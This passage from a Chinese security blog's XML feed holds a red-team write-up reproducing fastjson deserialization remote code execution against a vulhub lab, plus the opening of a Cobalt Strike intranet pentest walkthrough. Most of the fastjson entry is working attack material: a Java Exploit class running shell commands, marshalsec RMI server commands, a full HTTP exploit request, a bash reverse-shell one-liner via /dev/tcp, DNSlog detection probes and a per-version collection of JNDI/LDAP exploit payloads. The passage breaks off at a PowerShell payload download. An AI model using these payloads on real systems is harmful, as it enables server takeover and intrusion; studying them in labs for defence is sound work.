&#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现</title>
      <link href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01漏洞介绍"><a href="#0x01漏洞介绍" class="headerlink" title="0x01漏洞介绍"></a>0x01漏洞介绍</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h1 id="0x02影响范围"><a href="#0x02影响范围" class="headerlink" title="0x02影响范围"></a>0x02影响范围</h1><p>Fastjson &lt; 1.2.68</p><p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p><h1 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h1><p>下面以Fastjson 1.2.47 为例子，因为vulhub有现成的环境十分方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P牛我用vulhub中的 1.2.47的docker   想测试doslog检查 fastjson 但是总是收到不到dnslog  但是正常的exp反弹shell就是可以我很疑惑    </span><br><span class="line">我的用法正确吗，用的这个&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bouaiq.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="下面是流程示意图"><a href="#下面是流程示意图" class="headerlink" title="下面是流程示意图"></a>下面是流程示意图</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p><p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI/LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p><h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</p><p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p><p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p><p>4、主机A引发恶意系统命令执行</p><h1 id="0x04复现流程"><a href="#0x04复现流程" class="headerlink" title="0x04复现流程"></a>0x04复现流程</h1><p>根据上图流程和环境复现：</p><p>主机A： <a href="http://1.1.1.1:8090/" target="_blank" rel="noopener">http://1.1.1.1:8090</a> (存在Fastjson漏洞主机)<br>主机B： <a href="http://2.2.2.2:8888/" target="_blank" rel="noopener">http://2.2.2.2:8888</a> (恶意java类服务)<br>主机C： rmi://2.2.2.2:9999 (远程方法调用服务)</p><p>实际上主机B和C是一台机器不同端口）</p><h2 id="0x041-构造恶意方法"><a href="#0x041-构造恶意方法" class="headerlink" title="0x041 构造恶意方法"></a>0x041 构造恶意方法</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码</p><p>使用如下payload：</p><p>其中touch /zydx666为系统命令，可以根据自己需求随意修改</p><p>注意该文件名叫Exploit.java固定格式不能变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Exploit() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"touch /zydx666"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(String[] args) throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主机B中使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><p>然后在主机B启一个http服务，中间件随意，但是需要能访问到Exploit.class文件，这里使用python3临时启动一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="0x042-开启远程方法调用rmi服务"><a href="#0x042-开启远程方法调用rmi服务" class="headerlink" title="0x042 开启远程方法调用rmi服务"></a>0x042 开启远程方法调用rmi服务</h2><p>接下来在<strong>主机C</strong>开启rmi服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999</span><br></pre></td></tr></table></figure><p>marshalsec-0.0.3-SNAPSHOT-all.jar</p><p>参考 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>至此服务已经全部就绪</p><h2 id="0x043-发送payload"><a href="#0x043-发送payload" class="headerlink" title="0x043 发送payload"></a>0x043 发送payload</h2><p>接下来向<strong>主机A</strong>（存在漏洞机子）发送fastjson反序列化漏洞payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    "a":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"java.lang.Class",</span></span><br><span class="line"><span class="comment">        "val":"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    "b":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"com.sun.rowset.JdbcRowSetImpl",</span></span><br><span class="line"><span class="comment">        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",</span></span><br><span class="line"><span class="comment">        "autoCommit":true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>此时主机A收到POST请求，触发反序列化漏洞，最终执行Exploit.class 文件中的内容</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png" alt="image-20200703234748062"></p><p>我使用的是反弹shell命令</p><p>反弹shell成功：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png" alt="image-20200703234115010"></p><h1 id="0x05简化版攻击工具"><a href="#0x05简化版攻击工具" class="headerlink" title="0x05简化版攻击工具"></a>0x05简化版攻击工具</h1><p>下面提供一个简化版工具的工具</p><p>是使用<a href="https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包</a></p><p>第一步：只需要在自己的服务器上启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 &quot;bash&#x3D;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;80 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>第二步：发送payload</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png" alt=""></p><p>成功反弹shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png" alt="image-20200703234914580"></p><h1 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h1><h2 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h2><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p><p>例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png" alt="image-20200704162617071"></p><h2 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h2><p>我使用以下payload测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png" alt="image-20200704162844047"></p><p>最终收到dnslog</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png" alt="image-20200704162922529"></p><h2 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>畸形的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt=""></p><p>POC:</p><p>要嵌套在里面zeo里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h1 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h1><p>影响版本：</p><h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>影响版本：</p><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网中CobaltStrike4.0（CS4）的渗透之旅</title>
      <link href="/2020/07/02/%E5%86%85%E7%BD%91%E4%B8%ADCobaltStrike4.0%EF%BC%88CS4%EF%BC%89%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"/>
      <url>/2020/07/02/%E5%86%85%E7%BD%91%E4%B8%ADCobaltStrike4.0%EF%BC%88CS4%EF%BC%89%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是老以前做的一个，主要熟悉一下cs4的新特性，还是发出来看看吧，流程简单一些，但是内网流程还是比较完整的。大家可以看看</p><ul><li>本次靶机为红日安全的ATT&amp;CK第五个靶场。</li><li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></li><li>思路参考 <strong>记一次在Vulnstack ATT&amp;CK 5 靶场中使用CobaltStrike的渗透之旅</strong></li><li>文章中如有错误的地方望大佬指正。</li><li>菜鸡文章望大佬勿喷。</li></ul><h1 id="0x00信息收集"><a href="#0x00信息收集" class="headerlink" title="0x00信息收集"></a>0x00信息收集</h1><p>Namp 扫一下</p><p>发现 80 3306</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDAzNTcucG5n?x-oss-process=image/format,png" alt="image-20200326201051940"></p><p>访问一下发现thinkphp5 记得是有rce的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDAzNTgucG5n?x-oss-process=image/format,png" alt="image-20200326201233266"></p><p>searchsploit thinkphp</p><p>有货</p><h1 id="0x00入口权限获取"><a href="#0x00入口权限获取" class="headerlink" title="0x00入口权限获取"></a>0x00入口权限获取</h1><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100359.png" alt="image-20200326201527710"></p><p>cool可以用</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0MDAucG5n?x-oss-process=image/format,png" alt="image-20200326202900905"></p><p>上传的姿势太多了，我就使用一个最简单的</p><p>使用powershell 下载 CS payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="keyword">new</span>-<span 